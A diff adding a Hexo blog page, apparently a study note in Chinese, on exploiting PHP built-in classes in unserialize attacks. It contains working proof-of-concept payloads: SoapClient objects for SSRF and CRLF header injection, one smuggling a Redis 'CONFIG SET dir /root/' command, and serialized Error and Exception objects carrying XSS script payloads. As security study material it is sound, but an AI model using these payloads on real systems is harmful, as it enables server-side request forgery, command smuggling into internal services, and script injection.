@@ -1,0 +1,140 @@
+<!doctype html>
+<head>
+  <meta charset="utf-8">
+  <meta name="description" content="&lt;h2 id=&#34;基础知识&#34;&gt;&lt;a href=&#34;#基础知识&#34; class=&#34;headerlink&#34; title=&#34;基础知识&#34;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;首先回顾一下序列化中的魔术方法，下面也将以此进行分类来进行研究&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;li">
+  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
+  <title>反序列化之PHP原生类的利用 | powercat</title>
+
+  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
+  <script>
+let link = document.getElementById('chosen-theme')
+let widget = document.createElement('div')
+widget.style.position = 'absolute'
+widget.style.right = '5px'
+widget.style.top = '2px'
+widget.style.background = 'beige'
+widget.style.color = '#444'
+widget.style.zIndex = 99
+widget.style.padding = '4px 8px'
+widget.innerHTML = `
+<label>
+  <p>No theme was set on <code>theme_config</code>.<br>
+     Choose a theme from the list to experiment with it:</p>
+  <select></select>
+</label>
+`
+fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
+  .then(r => r.json())
+  .then(files => {
+    document.body.appendChild(widget)
+    let select = document.querySelector('select')
+    files
+      .filter(f => f.type === 'dir')
+      .forEach(f => {
+        let option = document.createElement('option')
+        option.value = f.name
+        option.innerHTML = f.name
+        select.appendChild(option)
+      })
+    let options = Array.from(select.querySelectorAll('option'))
+    let chosen = options[parseInt(Math.random() * options.length)]
+    chosen.selected = true
+    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
+    select.addEventListener('change', e => {
+      let chosen = e.target.value
+      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
+    })
+  })
+  .catch(console.log)
+  </script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <header role="banner">
+      <a href="/">
+        
+          <img src="https://picsum.photos/640/480">
+        
+      </a>  
+    <h1>
+      <a href="/">powercat</a>
+    </h1>
+    <aside>
+      <p></p>
+    </aside>
+  </header>
+  
+  <main>
+    <article>
+  <header>
+  
+  <h1><a href="http://example.com/2021/11/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">反序列化之PHP原生类的利用</a></h1>
+  <aside>
+    
+    <time datetime="212021-11-07">
+      November 7th 2021
+    </time>
+    
+    <ul>
+    
+      <li><a href="/tags/study/">study</a></li>
+    
+    </ul>
+  </aside>
+</header>
+
+  <div><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>首先回顾一下序列化中的魔术方法，下面也将以此进行分类来进行研究</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当对象被创建的时候调用：__construct</span><br><span class="line">当对象被销毁的时候调用：__destruct</span><br><span class="line">当对象被当作一个字符串使用的时候调用(不仅仅是echo的时候，比如file_exists()判断也会触发)：__toString</span><br><span class="line">序列化对象之前就调用此方法(其返回需要是一个数组)：__sleep</span><br><span class="line">反序列化恢复对象之前就调用此方法：__wakeup</span><br><span class="line">当调用对象中不存在的方法会自动调用此方法：__call</span><br></pre></td></tr></table></figure>
+
+<p>看一下当前php本身内置类有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>有些类不能够进行反序列化，php使用了<strong>zend_class_unserialize_deny</strong>来禁止一些类的反序列化，比如序列化<strong>DirectoryIterator</strong>的时候。</p>
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165014708-1262920365.jpg" alt="img"></p>
+<p>当然这也和php版本也有一些关系，寻找的几个类中，发现在php5.3以前都是没有如此的限制。</p>
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165027190-1950745549.jpg" alt="img"></p>
+<h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><h3 id="SoupClient"><a href="#SoupClient" class="headerlink" title="SoupClient"></a>SoupClient</h3><p>这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类。</p>
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165041409-1571225758.jpg" alt="img"></p>
+<p>但是它仅限于http&#x2F;https协议，用处不是很大。</p>
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165053500-716737406.jpg" alt="img"></p>
+<p>但是这里http头部存在crlf漏洞，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /root/&quot;</span>;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://example.com:5555/&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$aaa</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">notexists</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165113533-1948175046.jpg" alt="img"></p>
+<p>对于如何发送POST的数据包，这里面还有一个坑，就是<strong>content-type</strong>的设置，当时可以看到上面的数据包，<strong>user_agent</strong>的头部是在<strong>content-type</strong>的下面，所以我们可以通过<strong>SoapClient</strong>来设置<strong>user_agent</strong>，再使用crlf将<strong>content-type</strong>给往下挤。</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://example.com:5555/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165126622-199442235.jpg" alt="img"></p>
+<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>适用于php7版本</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>开启报错的情况下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$t</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images2018.cnblogs.com/blog/804631/201803/804631-20180316165139761-1813736165.jpg" alt="img"></p>
+<h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>适用于php5、7版本</p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>)；</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例化任意类"><a href="#实例化任意类" class="headerlink" title="实例化任意类"></a>实例化任意类</h2><p>可调用任意类的时候找<code>__construct</code>的时候一些可用的类：<br> 案例：<a target="_blank" rel="noopener" href="https://5haked.blogspot.jp/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1">pornhub某漏洞</a></p>
+<p>可获取目录<br> DirectoryIterator</p>
+<p>XXE<br> SimpleXMLElement</p>
+<p>创建空白文件<br> SQLite3</p>
+<p>know it then do it</p>
+</div>
+</article>
+
+  </main>
+  <aside>
+    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
+<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>
+
+  </aside>
+  <footer role="contentinfo">
+    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
+<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>
+
+  </footer>
+</body>
